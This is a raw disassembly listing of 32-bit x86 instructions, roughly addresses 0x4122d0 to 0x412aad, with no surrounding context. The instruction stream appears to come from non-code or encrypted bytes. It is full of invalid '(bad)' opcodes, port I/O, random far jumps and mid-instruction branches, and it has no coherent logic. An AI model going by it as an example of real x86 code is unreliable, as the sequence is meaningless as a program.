  4122d0:	sbb    bh,0xeb
  4122d3:	sub    edi,DWORD PTR [ebx-0x16]
  4122d6:	test   BYTE PTR [edi+edi*8+0x328fe90a],0x35
  4122de:	aaa    
  4122df:	and    BYTE PTR [eax-0x4c0e3c58],dh
  4122e5:	mov    WORD PTR [esi-0x67ab7e4f],?
  4122eb:	das    
  4122ec:	aad    0x7
  4122ee:	push   eax
  4122ef:	push   esi
  4122f0:	push   0x1f
  4122f2:	stc    
  4122f3:	pop    edx
  4122f4:	mov    ds:0x5d301ae2,eax
  4122f9:	cmp    BYTE PTR [edi+0x51],bl
  4122fc:	lahf   
  4122fd:	(bad)  
  4122fe:	aam    0x5a
  412300:	in     al,0x8f
  412302:	pop    edx
  412303:	out    0x64,eax
  412305:	push   DWORD PTR [edi]
  412307:	dec    edx
  412308:	(bad)  ds:[ecx+0x12c88ad7]
  41230f:	xchg   BYTE PTR [edx+0x40],ch
  412312:	xlat   BYTE PTR ds:[ebx]
  412313:	jge    0x412341
  412315:	xor    al,0xad
  412317:	scas   al,BYTE PTR es:[edi]
  412318:	xor    eax,0xbbddf2ec
  41231d:	xchg   edx,ecx
  41231f:	out    0x85,al
  412321:	mov    esi,0x6af07e19
  412326:	push   edi
  412327:	inc    esi
  412328:	lods   al,BYTE PTR ds:[esi]
  412329:	adc    BYTE PTR [eax-0x3bdb4d4c],bh
  41232f:	push   ss
  412330:	fstp   st(4)
  412332:	mov    dh,0x63
  412334:	sahf   
  412335:	add    ah,ch
  412337:	fidivr WORD PTR [ecx+eiz*1-0x21111df2]
  41233e:	nop
  41233f:	cwde   
  412340:	addr16 push cs
  412342:	test   eax,0x8e0417ee
  412347:	retf   
  412348:	neg    dl
  41234a:	sub    cl,BYTE PTR [eax+0x7c]
  41234d:	jl     0x41234b
  41234f:	fidivr DWORD PTR [edx]
  412351:	test   BYTE PTR [edi+0x433a28b9],bl
  412357:	je     0x412345
  412359:	(bad)  
  41235a:	fld    QWORD PTR [esi+0x4e651556]
  412360:	int3   
  412361:	iret   
  412362:	(bad)  
  412363:	jle    0x412365
  412365:	dec    ecx
  412366:	enter  0xb699,0x9a
  41236a:	stc    
  41236b:	fild   WORD PTR [eax+0x36]
  41236e:	dec    ebp
  41236f:	leave  
  412370:	xchg   esp,eax
  412371:	bound  edi,QWORD PTR [ecx-0x38]
  412374:	mov    ds:0xc9a86c4a,eax
  412379:	sub    ch,BYTE PTR [edx-0x55]
  41237c:	in     al,dx
  41237d:	outs   dx,DWORD PTR ds:[esi]
  41237e:	xor    BYTE PTR [ebp+0x1aad8067],al
  412384:	inc    edx
  412385:	push   ds
  412386:	pop    es
  412387:	stos   DWORD PTR es:[edi],eax
  412388:	pusha  
  412389:	jle    0x4123d0
  41238b:	fidivr WORD PTR [ebx+0x7206f858]
  412391:	jb     0x41237e
  412393:	dec    ebp
  412394:	pop    es
  412395:	(bad)  
  412396:	call   0xccd2c21
  41239b:	jae    0x4123f9
  41239d:	das    
  41239e:	jle    0x412383
  4123a0:	mov    cl,0x27
  4123a2:	rcr    BYTE PTR [edi-0x78],0x5
  4123a6:	lea    ecx,[ecx-0x2190715b]
  4123ac:	loopne 0x412409
  4123ae:	pop    ss
  4123af:	outs   dx,DWORD PTR ds:[esi]
  4123b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4123b1:	pushf  
  4123b2:	addr16 jnp 0x412415
  4123b5:	xor    ecx,DWORD PTR [edi]
  4123b7:	xor    bh,BYTE PTR [ecx]
  4123b9:	sbb    eax,DWORD PTR [ecx+ecx*1]
  4123bc:	jmp    0x41243d
  4123be:	sub    eax,0x1e4de2ee
  4123c3:	pop    esp
  4123c4:	psrlw  mm4,QWORD PTR [eax]
  4123c7:	js     0x4123db
  4123c9:	icebp  
  4123ca:	and    edi,DWORD PTR [ebx]
  4123cc:	inc    edi
  4123cd:	xchg   esp,eax
  4123ce:	pop    eax
  4123cf:	out    dx,eax
  4123d0:	cmp    al,BYTE PTR [edi]
  4123d2:	test   DWORD PTR [ebx+0x11],0x33b1e2eb
  4123d9:	bound  ecx,QWORD PTR [ecx+0x44]
  4123dc:	pop    ecx
  4123dd:	scas   eax,DWORD PTR es:[edi]
  4123de:	mov    BYTE PTR [ebx+0x31253c1e],dh
  4123e4:	in     eax,dx
  4123e5:	push   esi
  4123e6:	push   ebx
  4123e7:	popa   
  4123e8:	mov    esp,0x5e1d5624
  4123ed:	add    BYTE PTR [eax],ah
  4123ef:	pop    ebx
  4123f0:	jmp    0x412405
  4123f2:	mov    ch,0xf4
  4123f4:	call   0x9004:0xa5ebaffe
  4123fb:	loop   0x41241f
  4123fd:	nop
  4123fe:	xor    dl,BYTE PTR [ebp+eax*1-0x3264b245]
  412405:	adc    eax,0x46c67bda
  41240a:	add    bl,BYTE PTR [ebp-0x52]
  41240d:	pusha  
  41240e:	aam    0x0
  412410:	sbb    al,0xa9
  412412:	ret    0x5781
  412415:	jae    0x41247d
  412417:	push   ebx
  412418:	inc    ecx
  412419:	pusha  
  41241a:	sbb    dh,bh
  41241c:	test   al,0x9a
  41241e:	dec    esi
  41241f:	fistp  DWORD PTR [ebx]
  412421:	imul   bl
  412423:	or     ah,dh
  412425:	rol    BYTE PTR [edi],cl
  412427:	out    dx,al
  412428:	dec    edx
  412429:	call   0xda3a:0x3cea9602
  412430:	sub    eax,0xbd7fcbb0
  412435:	jb     0x4123d3
  412437:	lds    edx,FWORD PTR [edx+edx*2+0x2d]
  41243b:	and    bh,0x83
  41243e:	aam    0x6a
  412440:	cmp    ecx,DWORD PTR [ecx]
  412442:	sub    cl,BYTE PTR [ebx-0x5891b003]
  412448:	inc    edx
  412449:	imul   esp,DWORD PTR ds:0xad6de2ea,0xcff09a50
  412453:	and    al,0xc2
  412455:	sub    dl,dl
  412457:	pop    edi
  412458:	mov    ds:0xf1fe344c,eax
  41245d:	loop   0x4124a4
  41245f:	add    al,0x27
  412461:	jnp    0x4124a3
  412463:	repz sub eax,0xa904b6a0
  412469:	cmp    al,0x29
  41246b:	jle    0x4124a6
  41246d:	sar    DWORD PTR [edx+0x4c],cl
  412470:	sub    BYTE PTR [esp+eiz*2],bl
  412473:	cs pusha 
  412475:	inc    ebx
  412476:	add    bl,BYTE PTR [ebx-0x3ef65fa3]
  41247c:	jmp    0x52e578e8
  412481:	pop    ecx
  412482:	(bad)  
  412483:	iret   
  412484:	sahf   
  412485:	adc    eax,0x969a44c
  41248b:	mov    bl,0x40
  41248d:	add    al,0x50
  412490:	adc    BYTE PTR [ecx-0x18],cl
  412493:	hlt    
  412494:	xchg   ebp,eax
  412495:	stc    
  412496:	test   DWORD PTR [eax-0x68],esp
  412499:	stc    
  41249a:	inc    ebp
  41249b:	xor    eax,0x761f1e92
  4124a0:	cmp    bl,BYTE PTR [edi+esi*4+0x6140c6a]
  4124a7:	sti    
  4124a8:	xlat   BYTE PTR ds:[ebx]
  4124a9:	loopne 0x412513
  4124ab:	ins    BYTE PTR es:[edi],dx
  4124ac:	vrsqrtss xmm5,xmm4,DWORD PTR [edi*4-0x6138e5dd]
  4124b5:	es jns 0x4124aa
  4124b8:	gs mov al,0xd9
  4124bb:	(bad)  
  4124bc:	rcl    DWORD PTR [ecx+0x26a441f0],cl
  4124c2:	clc    
  4124c3:	xchg   ebp,eax
  4124c4:	repnz daa 
  4124c6:	push   cs
  4124c7:	or     DWORD PTR [ecx],ebx
  4124c9:	pop    ds
  4124ca:	cmp    BYTE PTR [edi+0x67],bl
  4124cd:	adc    edx,DWORD PTR [eax-0x2c]
  4124d0:	mov    WORD PTR [edx],es
  4124d2:	out    0x5b,eax
  4124d4:	pushf  
  4124d5:	clc    
  4124d6:	adc    eax,0x1b5a8b36
  4124db:	call   0x2576:0x808b6fa3
  4124e2:	pushf  
  4124e3:	sub    eax,0xb6b04961
  4124e8:	mov    BYTE PTR [ebx+ecx*2-0x50],cl
  4124ec:	popa   
  4124ed:	retf   0xf714
  4124f0:	push   esp
  4124f1:	ja     0x41254d
  4124f3:	push   ebx
  4124f4:	adc    dh,ah
  4124f6:	jecxz  0x412491
  4124f8:	cdq    
  4124f9:	js     0x412530
  4124fb:	lock mov ecx,DWORD PTR [ecx-0x53]
  4124ff:	and    ecx,DWORD PTR [eax]
  412501:	xchg   DWORD PTR [esi+0xb20a39e],ebp
  412507:	and    ebx,DWORD PTR [eax-0x61]
  41250a:	push   cs
  41250b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41250c:	mov    eax,ds:0x5834d944
  412511:	leave  
  412512:	inc    edi
  412513:	bound  ecx,QWORD PTR [eax]
  412515:	(bad)  
  412517:	shl    DWORD PTR [eax+0x11],0x6b
  41251b:	xor    DWORD PTR [edx-0x4e54d4f2],esi
  412521:	mov    dl,BYTE PTR [edx+0x2d]
  412524:	mov    BYTE PTR [edi+0x42162344],ah
  41252a:	push   ebx
  41252b:	aam    0x9c
  41252d:	jmp    0x4124cc
  41252f:	cld    
  412530:	data16 jns 0x41253f
  412533:	mov    ebp,0x920649b
  412538:	hlt    
  412539:	sbb    esi,esi
  41253b:	jmp    0xd7223972
  412540:	inc    edx
  412541:	sub    edx,DWORD PTR [ecx+0x1c]
  412544:	or     al,0xba
  412546:	lea    ebx,[edx+0x38667913]
  41254c:	jno    0x412544
  41254e:	stos   DWORD PTR es:[edi],eax
  41254f:	pop    edi
  412550:	shl    BYTE PTR [edx],cl
  412552:	sbb    eax,0xa8f88e9f
  412557:	enter  0x337,0xfb
  41255b:	retf   
  41255c:	inc    ecx
  41255d:	shr    ecx,1
  41255f:	mov    edx,0xee438466
  412564:	sbb    eax,0x32759448
  412569:	ret    
  41256a:	sub    edi,DWORD PTR [esi]
  41256c:	pushf  
  41256d:	test   DWORD PTR ds:0xd589810f,0xd22fd42f
  412577:	lods   eax,DWORD PTR ds:[esi]
  412578:	mov    BYTE PTR [ecx],dl
  41257a:	loopne 0x41251a
  41257c:	test   DWORD PTR [edx+0x27],ebp
  41257f:	cmp    eax,DWORD PTR [ebp-0x16]
  412582:	dec    edi
  412583:	aad    0x24
  412585:	lahf   
  412586:	xchg   edi,eax
  412587:	mov    al,0xa1
  412589:	pop    esi
  41258a:	mov    ebx,0x2c56eb59
  41258f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412590:	lahf   
  412591:	fst    QWORD PTR [eax-0x780eb644]
  412597:	loop   0x412581
  412599:	add    BYTE PTR [ecx],dl
  41259b:	lods   eax,DWORD PTR ds:[esi]
  41259c:	cmp    DWORD PTR [ecx-0x63],0x18654608
  4125a3:	adc    eax,0xba7e358b
  4125a8:	adc    bh,BYTE PTR [eax+0x63789bb9]
  4125ae:	xchg   DWORD PTR [edx-0x6abc1e11],esi
  4125b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4125b5:	rcl    DWORD PTR [ecx],0x18
  4125b8:	xchg   BYTE PTR [ebx],ah
  4125ba:	sbb    BYTE PTR [eax+0x66],dh
  4125bd:	jne    0x4125ca
  4125bf:	pushf  
  4125c0:	imul   edi,DWORD PTR [ecx-0x36f6b252],0x81e8e0cf
  4125ca:	and    al,0xb8
  4125cc:	cli    
  4125cd:	sbb    al,0x7c
  4125cf:	neg    al
  4125d1:	sahf   
  4125d2:	or     bh,BYTE PTR [ebx]
  4125d4:	sub    al,ch
  4125d6:	outs   dx,DWORD PTR ds:[esi]
  4125d7:	int    0x24
  4125d9:	aad    0x3
  4125db:	add    al,0x6c
  4125dd:	mov    eax,ds:0x81e85ec7
  4125e2:	shr    BYTE PTR [ecx+0x7ada79ce],0x7b
  4125e9:	hlt    
  4125ea:	pop    ebp
  4125eb:	xor    bh,BYTE PTR [ebx]
  4125ed:	push   ss
  4125ee:	add    eax,0x41917d79
  4125f3:	inc    ebx
  4125f4:	cld    
  4125f5:	push   es
  4125f6:	je     0x41259f
  4125f8:	xchg   edi,eax
  4125f9:	push   ecx
  4125fa:	add    DWORD PTR [edx],ebx
  4125fc:	bound  esi,QWORD PTR [esi+0x3bb23a34]
  412602:	fiadd  WORD PTR [ebp-0x48]
  412605:	or     eax,0xfb2a94ae
  41260a:	pushf  
  41260b:	clc    
  41260c:	fdivr  QWORD PTR [edi]
  41260e:	push   eax
  41260f:	mul    DWORD PTR [edx+eiz*2+0x52]
  412613:	ror    DWORD PTR [ebx-0x54],cl
  412616:	mov    BYTE PTR [ecx+ebp*2-0x623eddeb],dh
  41261d:	sub    BYTE PTR [esi],0xa6
  412620:	fisttp DWORD PTR [ebp+0x3b47b061]
  412626:	xchg   ecx,edi
  412628:	mov    al,0x7c
  41262a:	add    edx,DWORD PTR [ebx+0x493dc3bf]
  412630:	stc    
  412631:	sbb    ebx,esp
  412633:	mov    edx,0x4ea92264
  412638:	in     eax,0xb0
  41263a:	(bad)  
  41263b:	scas   al,BYTE PTR es:[edi]
  41263c:	loopne 0x412648
  41263e:	into   
  41263f:	jne    0x4125f6
  412641:	cmp    al,0x9d
  412643:	mov    ah,0x96
  412645:	test   al,0x8c
  412647:	jo     0x412672
  412649:	and    ch,BYTE PTR [ecx-0x78]
  41264c:	popa   
  41264d:	xchg   edi,eax
  41264e:	test   BYTE PTR [ecx-0x1ebfe6e7],ah
  412654:	or     al,0x3f
  412656:	fidiv  WORD PTR [ebx+ebp*8]
  412659:	push   esp
  41265a:	adc    dh,bl
  41265c:	loopne 0x412655
  41265e:	pusha  
  41265f:	pop    ebx
  412660:	in     al,dx
  412661:	mov    dh,BYTE PTR [edi]
  412663:	imul   edi,DWORD PTR gs:[ecx+0x61],0x79
  412668:	or     BYTE PTR [edx+0x7c],ch
  41266b:	add    al,bl
  41266d:	dec    edi
  41266e:	or     BYTE PTR [ebx+0x123f5177],0xf
  412675:	mov    eax,ds:0xbeda6cf3
  41267a:	sub    edi,esi
  41267c:	jl     0x4126a3
  41267e:	mov    edi,DWORD PTR [ebx+0x27]
  412681:	les    ebp,FWORD PTR [eax-0x4c]
  412684:	outs   dx,BYTE PTR ds:[esi]
  412685:	and    eax,0x1232cf8d
  41268a:	in     al,0xe4
  41268c:	mov    bh,0x8a
  41268e:	mov    ebp,0xd21c7348
  412693:	xchg   esp,esp
  412695:	pop    ecx
  412696:	test   al,0x3d
  412698:	jmp    0x41265e
  41269a:	ret    
  41269b:	mov    cl,0xd1
  41269d:	jecxz  0x4126e4
  41269f:	ror    BYTE PTR [edi-0x442dbedb],1
  4126a5:	lods   al,BYTE PTR ds:[esi]
  4126a6:	outs   dx,BYTE PTR ds:[esi]
  4126a7:	(bad)  
  4126a8:	test   al,0x7d
  4126aa:	jno    0x412693
  4126ac:	pop    ecx
  4126ad:	jge    0x4126e9
  4126af:	cmc    
  4126b0:	repnz mov fs,WORD PTR [ecx]
  4126b3:	aam    0xf4
  4126b5:	pop    ds
  4126b6:	jno    0x41271a
  4126b8:	sbb    BYTE PTR [ebx-0x9],al
  4126bb:	bound  esi,QWORD PTR [ecx+0x22]
  4126be:	adc    BYTE PTR [ebx+0x680f2b48],cl
  4126c4:	cmp    eax,0x601676aa
  4126c9:	cmp    al,0x9e
  4126cb:	loope  0x412731
  4126cd:	stc    
  4126ce:	outs   dx,BYTE PTR ds:[esi]
  4126cf:	jp     0x4126a1
  4126d1:	or     eax,0x14f1c732
  4126d6:	scas   eax,DWORD PTR es:[edi]
  4126d7:	mov    ebp,es
  4126d9:	push   es
  4126da:	fs push cs
  4126dc:	loop   0x41267d
  4126de:	pop    es
  4126df:	push   es
  4126e0:	cmc    
  4126e1:	cmp    esp,DWORD PTR [ebx-0x6f70208]
  4126e7:	cmp    ebx,DWORD PTR [edi+0x76]
  4126ea:	jle    0x41266e
  4126ec:	test   BYTE PTR [ebx+0x49],dl
  4126ef:	cmovp  ecx,DWORD PTR [edi+0x20155ba8]
  4126f6:	test   esi,eax
  4126f8:	neg    DWORD PTR [ecx-0x1b68d6b3]
  4126fe:	sbb    BYTE PTR [edx+edx*8-0x56],dl
  412702:	push   ss
  412703:	add    bl,0xd2
  412706:	pop    ss
  412707:	dec    esi
  412708:	in     eax,dx
  412709:	pop    es
  41270a:	loope  0x4126e2
  41270c:	sub    al,0x62
  41270e:	js     0x41278c
  412710:	sti    
  412711:	or     DWORD PTR [edi+0x2481a4a9],0x9
  412718:	xchg   esi,eax
  412719:	mov    dh,0xed
  41271b:	test   eax,0x72e7f7e7
  412720:	jmp    0x412713
  412722:	adc    al,0x9f
  412724:	inc    esp
  412725:	add    eax,0x696f4f9a
  41272a:	mov    cl,0xf9
  41272c:	cmp    eax,0x8b500284
  412731:	in     eax,dx
  412732:	lods   al,BYTE PTR ds:[esi]
  412733:	call   0xf557:0xc18853cd
  41273a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41273b:	mov    ?,ecx
  41273d:	mov    cl,0xc9
  41273f:	mov    al,0xeb
  412741:	xchg   esi,eax
  412742:	push   edi
  412743:	popf   
  412744:	and    al,0xfd
  412746:	pop    esi
  412747:	jmp    0x8b37:0xd84b5932
  41274e:	outs   dx,BYTE PTR ds:[esi]
  41274f:	js     0x4126da
  412751:	not    eax
  412753:	pop    ds
  412754:	pop    esi
  412755:	adc    BYTE PTR [esi+esi*2-0x5],ah
  412759:	sahf   
  41275a:	xchg   edi,eax
  41275b:	in     eax,0xc8
  41275d:	dec    edi
  41275e:	aas    
  41275f:	imul   esi,DWORD PTR cs:[ecx+eiz*2],0x22
  412764:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412765:	xor    ebp,DWORD PTR [ebp-0x17561411]
  41276b:	(bad)  [esi+0x3c]
  41276e:	addr16 out 0x60,eax
  412771:	push   ss
  412772:	pushf  
  412773:	lea    eax,[edi]
  412775:	fild   WORD PTR [edx-0x16]
  412778:	and    cl,BYTE PTR [eax-0x10]
  41277b:	scas   al,BYTE PTR es:[edi]
  41277c:	cmp    BYTE PTR ds:0x9fa7b42a,bl
  412782:	outs   dx,BYTE PTR ds:[esi]
  412783:	imul   ebx,DWORD PTR [ecx-0x6074106e],0xcb8866a0
  41278d:	test   DWORD PTR [ebx],edx
  41278f:	sub    dh,BYTE PTR [esi+0x127dc6eb]
  412795:	sbb    ebx,DWORD PTR [ebx-0x7f97e6b3]
  41279b:	jae    0x412810
  41279d:	or     DWORD PTR [esp+eax*4-0x25],eax
  4127a1:	in     eax,0x33
  4127a3:	jmp    0x412730
  4127a5:	cmp    edi,esp
  4127a7:	fmul   QWORD PTR [edx+ecx*8+0x3993fa03]
  4127ae:	push   cs
  4127af:	mov    esi,gs
  4127b1:	cli    
  4127b2:	or     BYTE PTR [edx+0x43],bh
  4127b5:	imul   ebp,edx,0x4dcc8269
  4127bb:	xchg   esp,eax
  4127bc:	sti    
  4127bd:	jl     0x41277f
  4127bf:	call   0xce86aea8
  4127c4:	dec    ebx
  4127c5:	mov    ecx,0x23a8ccbe
  4127ca:	pop    ebx
  4127cb:	or     eax,0xb6573bb1
  4127d0:	inc    ebx
  4127d1:	xchg   ebp,eax
  4127d2:	cmp    DWORD PTR [eax+0x63770242],0x50c1fa17
  4127dc:	mov    ?,WORD PTR [esi-0x22]
  4127df:	mov    ds:0xfff78171,al
  4127e4:	push   ds
  4127e5:	cmp    BYTE PTR [edx],ah
  4127e7:	sub    DWORD PTR [edx-0x7f9f1b08],ecx
  4127ed:	pop    esi
  4127ee:	jo     0x412856
  4127f0:	ret    0xf723
  4127f3:	lds    ebp,FWORD PTR [ebx-0x6300c0dd]
  4127f9:	outs   dx,DWORD PTR ds:[esi]
  4127fa:	mov    BYTE PTR [esi-0x41a41098],ch
  412800:	test   DWORD PTR [edi-0x85ad08c],ecx
  412806:	test   bh,0x75
  412809:	push   ss
  41280a:	je     0x412864
  41280c:	pop    esi
  41280d:	xchg   esp,eax
  41280e:	pushf  
  41280f:	inc    esi
  412811:	mov    es,WORD PTR [ebp+0x13898b49]
  412817:	test   BYTE PTR [ebx+0x13],ah
  41281a:	js     0x4127b8
  41281c:	(bad)  
  41281d:	pop    edi
  41281e:	jecxz  0x4127e3
  412820:	sar    ebp,cl
  412822:	xor    al,0xa8
  412824:	mov    edx,0xf1c6abb1
  412829:	sbb    al,0x36
  41282b:	cmp    al,0xc1
  41282d:	fs sbb ah,bh
  412830:	mov    esi,0x62715ea5
  412835:	imul   esp,DWORD PTR [edx+eiz*1+0x7bfaac4c],0xad2e0b5a
  412840:	jmp    0x4127d8
  412842:	aas    
  412843:	inc    ebp
  412844:	loopne 0x4128c3
  412846:	jmp    0xf79b:0x42e2c1b3
  41284d:	xchg   edx,eax
  41284e:	jno    0x412856
  412850:	mov    bl,0x88
  412852:	addr16 data16 and al,0x1
  412856:	pop    esi
  412857:	test   BYTE PTR [ebx-0x71880478],cl
  41285d:	fwait
  41285e:	mov    BYTE PTR [eax-0x4a5e961e],bh
  412864:	jo     0x412875
  412866:	cli    
  412867:	std    
  412868:	sbb    DWORD PTR [ecx+0x1e],eax
  41286b:	and    BYTE PTR [bx+di+0x5059],ch
  412870:	jne    0x412856
  412872:	adc    BYTE PTR [ebx-0x5],dl
  412875:	push   ebx
  412876:	xchg   DWORD PTR [edx+0x4e],esi
  412879:	fcomp  DWORD PTR [ebp-0x196b8cca]
  41287f:	pop    eax
  412880:	push   0x997fcd2e
  412885:	call   0x2805:0xf4cf1c29
  41288c:	jne    0x412855
  41288e:	sbb    BYTE PTR [edx],dl
  412890:	xchg   edi,eax
  412891:	scas   al,BYTE PTR es:[edi]
  412892:	xchg   edx,eax
  412893:	test   DWORD PTR [edi+0x7c2b7627],ecx
  412899:	and    ebx,ecx
  41289b:	ss pop esp
  41289d:	jbe    0x412896
  41289f:	xchg   ecx,eax
  4128a0:	neg    BYTE PTR [edi]
  4128a2:	jnp    0x4128f6
  4128a4:	mov    edx,0x8094d09c
  4128a9:	retf   
  4128aa:	push   ds
  4128ab:	push   esi
  4128ac:	jbe    0x4128c0
  4128ae:	mov    bl,0x44
  4128b0:	xor    eax,0x898e4125
  4128b5:	mov    al,cl
  4128b7:	sub    DWORD PTR [edx],esi
  4128b9:	or     al,BYTE PTR [ebx+0x8]
  4128bc:	retf   
  4128bd:	je     0x4128a0
  4128bf:	enter  0xa005,0x7
  4128c3:	sbb    dh,bh
  4128c5:	adc    dh,BYTE PTR [ebx+0x24]
  4128c8:	mov    DWORD PTR [edi+0x71],ecx
  4128cb:	xchg   ebx,eax
  4128cc:	sti    
  4128cd:	mov    dl,0x39
  4128cf:	arpl   cx,dx
  4128d1:	push   edi
  4128d2:	dec    ecx
  4128d3:	leave  
  4128d4:	into   
  4128d5:	mov    ds:0x126ec635,al
  4128da:	or     eax,0x1fb45db6
  4128df:	js     0x41288e
  4128e1:	sub    al,0x81
  4128e3:	jmp    0xdcaa:0xc711c2c6
  4128ea:	(bad)
  4128ed:	and    DWORD PTR [esi+0x7ba93304],0x56
  4128f4:	inc    edx
  4128f5:	add    al,0x4c
  4128f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4128f8:	push   ebx
  4128f9:	cmp    bh,0xe6
  4128fc:	bound  esp,QWORD PTR [edx+0x22]
  4128ff:	int    0x23
  412901:	xor    al,0xe0
  412903:	int    0x3
  412905:	mov    edi,0xa3b5bb19
  41290a:	xor    al,0xc5
  41290c:	lahf   
  41290d:	xor    eax,0x913e2b47
  412912:	loope  0x412942
  412914:	adc    DWORD PTR [edi+ebp*1],esp
  412917:	addr16 xor eax,0x98899cbe
  41291d:	push   ss
  41291e:	cmp    DWORD PTR ds:0x71d0dfac,ebx
  412924:	fnstsw WORD PTR [ebp-0x5f]
  412927:	sub    al,0x6
  412929:	sbb    ebx,DWORD PTR [ebp+esi*2-0x5efce4e6]
  412930:	jmp    0xac17:0x6f7e4f80
  412937:	out    dx,al
  412938:	cmp    eax,0x5f95b1e4
  41293d:	mov    ch,0x6d
  41293f:	push   ecx
  412940:	fs in  al,dx
  412942:	mov    cl,0xbd
  412944:	arpl   WORD PTR [edx],si
  412946:	sti    
  412947:	xor    ebp,ebx
  412949:	in     eax,dx
  41294a:	loope  0x4128e2
  41294c:	int    0x6
  41294e:	pop    edi
  41294f:	in     eax,dx
  412950:	pushf  
  412951:	pop    ecx
  412952:	sbb    eax,ebx
  412954:	jne    0x4129d3
  412956:	lods   eax,DWORD PTR ds:[esi]
  412957:	dec    edx
  412958:	jns    0x412945
  41295a:	pop    es
  41295b:	int    0xe5
  41295d:	(bad)  
  41295f:	mov    bl,0xee
  412961:	test   BYTE PTR [edx],0x5d
  412964:	xchg   ebp,eax
  412965:	dec    ebx
  412966:	dec    edi
  412967:	loop   0x41298f
  412969:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41296a:	mov    cl,0xa4
  41296c:	adc    dh,ch
  41296e:	pop    esi
  41296f:	(bad)  
  412970:	mov    ebp,0xbab2e52a
  412975:	ins    BYTE PTR es:[edi],dx
  412976:	pop    edi
  412977:	popf   
  412978:	out    0xec,eax
  41297a:	inc    esi
  41297b:	enter  0xa3ad,0x28
  41297f:	dec    ecx
  412980:	mov    al,0xda
  412982:	lds    ecx,FWORD PTR [edi]
  412984:	xor    ecx,DWORD PTR [esi]
  412986:	cwde   
  412987:	jmp    0x9ea1bd19
  41298c:	push   eax
  41298d:	push   0x9dc0ea08
  412992:	cwde   
  412993:	pop    ebx
  412994:	out    dx,al
  412995:	cmc    
  412996:	sahf   
  412997:	inc    edx
  412998:	sub    ebp,DWORD PTR [ebx+edx*2]
  41299b:	or     al,0x0
  41299d:	mov    ebx,0x571d6494
  4129a2:	test   al,0x81
  4129a4:	mov    ch,0x42
  4129a6:	outs   dx,BYTE PTR ds:[esi]
  4129a7:	test   BYTE PTR [ebx-0x1795e7fb],dl
  4129ad:	arpl   WORD PTR [edx],bp
  4129af:	dec    ecx
  4129b0:	mov    al,0xa6
  4129b2:	(bad)  
  4129b3:	cmp    al,0xba
  4129b5:	and    BYTE PTR [si+0x2a],0x90
  4129ba:	aad    0x78
  4129bc:	popf   
  4129bd:	inc    ecx
  4129be:	dec    DWORD PTR [eax+0x1a]
  4129c1:	cmp    BYTE PTR [ecx-0x31],al
  4129c4:	ror    DWORD PTR [ebp-0x509f6164],0xf1
  4129cb:	inc    edx
  4129cc:	ins    BYTE PTR es:[edi],dx
  4129cd:	neg    DWORD PTR [ebp-0x5e]
  4129d0:	xor    DWORD PTR [ebp+0x7b],ebx
  4129d3:	sar    BYTE PTR [ecx+0x4],cl
  4129d6:	adc    eax,0x9172b53c
  4129db:	gs ret 0x28b9
  4129df:	loopne 0x412965
  4129e1:	inc    eax
  4129e2:	and    eax,0xc95ff44e
  4129e7:	pop    esp
  4129e8:	fstp   QWORD PTR [edx+0x3]
  4129eb:	repnz lahf 
  4129ed:	leave  
  4129ee:	inc    ebp
  4129ef:	fdivp  st(0),st
  4129f1:	sub    al,0x77
  4129f3:	int3   
  4129f4:	sar    BYTE PTR [eax*1+0x5e163bcf],1
  4129fb:	shr    BYTE PTR [esi-0x1213a447],0x61
  412a02:	ret    0xfaa8
  412a05:	add    BYTE PTR [ebp+0x42e93635],cl
  412a0b:	mov    eax,0x8b51723
  412a10:	pop    edx
  412a11:	inc    ebp
  412a12:	add    BYTE PTR [edi-0x36],ah
  412a15:	ss dec eax
  412a17:	bound  esi,QWORD PTR [edx+0x226ace66]
  412a1d:	retf   0xfc7b
  412a20:	or     al,0x11
  412a22:	rol    ah,1
  412a24:	bound  eax,QWORD PTR [ebp-0x7b]
  412a27:	adc    BYTE PTR [edi],ah
  412a29:	sub    DWORD PTR [ecx+0x11],eax
  412a2c:	mov    esp,0x1976576c
  412a31:	cdq    
  412a32:	out    0x25,eax
  412a34:	push   esp
  412a35:	imul   esi,DWORD PTR [eax],0xffffffc1
  412a38:	in     al,dx
  412a39:	out    0x70,eax
  412a3b:	xchg   edi,eax
  412a3c:	push   es
  412a3d:	adc    ah,BYTE PTR [esi-0x4bfa846e]
  412a43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a44:	inc    ebp
  412a45:	retf   
  412a46:	fld    QWORD PTR [esi]
  412a48:	mov    ds:0x4dcfa3ea,eax
  412a4d:	jbe    0x412a58
  412a4f:	xchg   ebx,eax
  412a50:	pusha  
  412a51:	(bad)  
  412a52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a53:	push   ss
  412a54:	dec    ebx
  412a55:	iret   
  412a56:	xlat   BYTE PTR ds:[ebx]
  412a57:	clc    
  412a58:	outs   dx,DWORD PTR ds:[esi]
  412a59:	data16 ror cl,cl
  412a5c:	xor    eax,0x7e01ea95
  412a61:	mov    eax,0xc3e13534
  412a66:	retf   0xda67
  412a69:	out    0x38,al
  412a6b:	add    ebp,DWORD PTR [edx+0x4e98ebe1]
  412a71:	aaa    
  412a72:	shl    edi,0xfd
  412a75:	push   0x8eae113
  412a7a:	out    dx,eax
  412a7b:	in     eax,0x9e
  412a7d:	fdivr  QWORD PTR [esi+0x6b]
  412a80:	xor    edx,ecx
  412a82:	es in  al,dx
  412a84:	int    0xc6
  412a86:	(bad)  
  412a87:	not    ecx
  412a89:	setl   bh
  412a8c:	aaa    
  412a8d:	(bad)
  412a91:	push   esp
  412a92:	push   ds
  412a93:	xchg   esp,eax
  412a94:	and    bl,dh
  412a96:	cli    
  412a97:	data16 int3 
  412a99:	in     al,dx
  412a9a:	sub    edx,esi
  412a9c:	out    dx,eax
  412a9d:	push   eax
  412a9e:	sbb    al,0x6e
  412aa0:	sti    
  412aa1:	scas   al,BYTE PTR es:[edi]
  412aa2:	push   esp
  412aa3:	(bad)  
  412aa4:	jo     0x412ab2
  412aa6:	xchg   edi,eax
  412aa7:	outs   dx,BYTE PTR ds:[esi]
  412aa8:	and    eax,0xeee292cc
  412aad:	cmp    eax,0x2903d2c8
